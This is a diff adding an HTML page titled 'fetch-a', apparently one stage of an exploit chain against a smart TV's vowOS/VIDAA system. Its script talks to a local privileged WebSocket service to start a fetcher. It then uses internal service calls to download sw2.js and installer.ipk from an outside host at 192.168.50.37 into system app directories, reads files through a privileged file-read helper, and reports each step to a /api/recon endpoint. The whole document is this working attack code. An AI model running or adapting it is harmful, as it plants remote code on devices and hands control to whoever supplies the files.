@@ -1,0 +1,61 @@
+<!doctype html>
+<!-- phase A: start fetcher and place sw2.js + installer.ipk (from this origin).
+     Saves progress to /recon after each step. -->
+<html><head><meta charset="utf-8"><title>fetch-a</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">phase A…</pre>
+<script>
+(function () {
+  "use strict";
+  var O = document.getElementById('o');
+  function log(m) { O.textContent += "\n" + m; return m; }
+  function post(t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", false);
+      x.setRequestHeader("Content-Type", "text/plain");
+      x.send("FETCH-A\n" + t);
+    } catch (e) {}
+  }
+  function raw(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var msg = r.msg;
+      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+      return { ret: r.ret, msg: String(msg == null ? "" : msg).slice(0, 400) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  setTimeout(function () {
+    var out = [];
+    try {
+      var ws = new WebSocket("wss://localhost:9888");
+      ws.onopen = function () {
+        ws.send(JSON.stringify({ path: "phoenix://service/basic/fetcher", method: "start",
+                                 parameters: {}, session: 907, timeout: 10 }));
+        setTimeout(function () { try { ws.close(); } catch (e) {} }, 1200);
+      };
+      out.push("fetcher: start sent");
+    } catch (e) { out.push("fetcher EXC " + e); }
+    post(out.join("\n"));
+    setTimeout(function () {
+      try {
+        var args = JSON.stringify({ url: "http://192.168.50.37:9000/pub/sw2.js",
+                                    directory: "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",
+                                    permission: 420 });
+        var r = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args });
+        out.push("sw2.js -> " + JSON.stringify(r.ret) + " " + JSON.stringify(r.msg).slice(0, 80));
+      } catch (e) { out.push("sw2.js EXC " + e); }
+      post(out.join("\n"));
+      setTimeout(function () {
+        try {
+          var args = JSON.stringify({ url: "http://192.168.50.37:9000/pub/installer.ipk",
+                                      directory: "/APPS/installer.ipk", permission: 420 });
+          var r = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args });
+          out.push("ipk -> " + JSON.stringify(r.ret) + " " + JSON.stringify(r.msg).slice(0, 80));
+        } catch (e) { out.push("ipk EXC " + e); }
+        post(out.join("\n"));
+        log(out.join("\n"));
+      }, 4000);
+    }, 3000);
+  }, 1500);
+})();
+</script></body></html>
